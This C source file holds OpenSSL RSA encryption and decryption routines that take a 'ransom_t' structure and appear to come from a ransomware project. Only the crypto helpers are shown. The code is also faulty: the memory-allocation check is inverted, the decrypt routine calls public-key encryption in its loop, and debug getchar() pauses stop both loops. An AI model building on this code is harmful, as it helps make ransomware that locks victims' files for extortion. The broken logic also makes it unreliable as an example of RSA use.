#include "fournights.h"

/**
  * createRSA - Create an RSA key
 (* http://hayageek.com/rsa-encryption-decryption-openssl-c/
  * @key: RSA key
  * @cipher_flag: 'e' for encrypt 'd' for decrypt
  * Return: pointer to RSA object
  */
RSA *createRSA(unsigned char *key, char cipher_flag)
{
    RSA *rsa = NULL;
    BIO *keybio ;

    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
#ifndef NO_DEBUG
		fprintf(stderr, "Failed to create key BIO\n");
#endif
        return 0;
    }
    if(cipher_flag == 'e')
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
    else if (cipher_flag == 'd')
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
    if(rsa == NULL)
#ifndef NO_DEBUG
		fprintf(stderr,"Failed to create RSA\n");
#endif
    return (rsa);
}

int encrypt_rsa(char *buffer, ransom_t *ransom)
{
	int padding = RSA_PKCS1_PADDING;
	int buf_size = 0;
	int plaintext_block_offset = 0;
	int ciphertext_block_offset = 0;
	int cipher_block_size = 0;
	int cipher_buf_size = 0;
	unsigned char *cipher_buf = NULL;
	RSA *rsa;

	cipher_buf = TMP_BUFS->cipher_buf;
	buf_size = TMP_BUFS->bytes_read;
	/* RSA */
	rsa = createRSA(ransom->rsa_key, ransom->cipher_flag);
	cipher_block_size = RSA_size(rsa) - 11;

	do {

		ciphertext_block_offset += cipher_buf_size;
		plaintext_block_offset += cipher_buf_size;

		cipher_buf_size += RSA_public_encrypt(cipher_block_size, (unsigned char *)buffer + plaintext_block_offset, (unsigned char *)cipher_buf + ciphertext_block_offset, rsa, padding);

		printf("plaintext bufsize: %d\n", buf_size);
		printf("plaintext block offset: %d\n", plaintext_block_offset);
		printf("ciphertext block offset: %d\n", ciphertext_block_offset);
		getchar();
	} while((buf_size - plaintext_block_offset) > cipher_block_size);

#ifndef NO_DEBUG
		printf("plaintext_buf: %s\n", buffer);
		printf("cipher_buf: %s\n", (char *)cipher_buf);
		printf("-----------------------------\n");
#endif
	return(cipher_buf_size);
}

int decrypt_rsa(char *buffer, ransom_t *ransom)
{
	int buf_size = 0;
	int plaintext_block_offset = 0;
	int ciphertext_block_offset = 0;
	int cipher_block_size = 0;
	int cipher_buf_size = 0;

	unsigned char *cipher_buf = NULL;
	char *priv_key_buf = NULL;
	FILE *priv_key = NULL;
	struct stat priv_key_info;
	int padding = RSA_PKCS1_PADDING;
	RSA *rsa;

	buf_size = TMP_BUFS->bytes_read;
	cipher_buf = TMP_BUFS->cipher_buf;
	if ((priv_key = fopen("private.pem", "r")))
	{
		lstat("private.pem", &priv_key_info);
		printf("private key size = %d\n", (int)priv_key_info.st_size);
		if((priv_key_buf = malloc((int)priv_key_info.st_size * sizeof(char))))
			fprintf(stderr, "Out of memory\n");
		fread(priv_key_buf, (size_t)priv_key_info.st_size - 1, sizeof(char), priv_key);
	}
	fclose(priv_key);
	rsa = createRSA((unsigned char *)priv_key_buf, ransom->cipher_flag);
	cipher_block_size = RSA_size(rsa) - 11;

	do {
		ciphertext_block_offset += cipher_buf_size;
		plaintext_block_offset += cipher_buf_size;

		cipher_buf_size += RSA_public_encrypt(cipher_block_size, (unsigned char *)buffer + plaintext_block_offset, (unsigned char *)cipher_buf + ciphertext_block_offset, rsa, padding);

		printf("plaintext bufsize: %d\n", buf_size);
		printf("plaintext block offset: %d\n", plaintext_block_offset);
		printf("ciphertext block offset: %d\n", ciphertext_block_offset);
		getchar();

	} while((buf_size - plaintext_block_offset) > cipher_block_size);

#ifndef NO_DEBUG
		printf("plaintext_buf: %s\n", buffer);
		printf("cipher_buf: %s\n", (char *)cipher_buf);
		printf("-----------------------------\n");
#endif

	cipher_buf_size = RSA_private_decrypt(buf_size, (unsigned char *)buffer, cipher_buf, rsa, padding);
	return(cipher_buf_size);
}
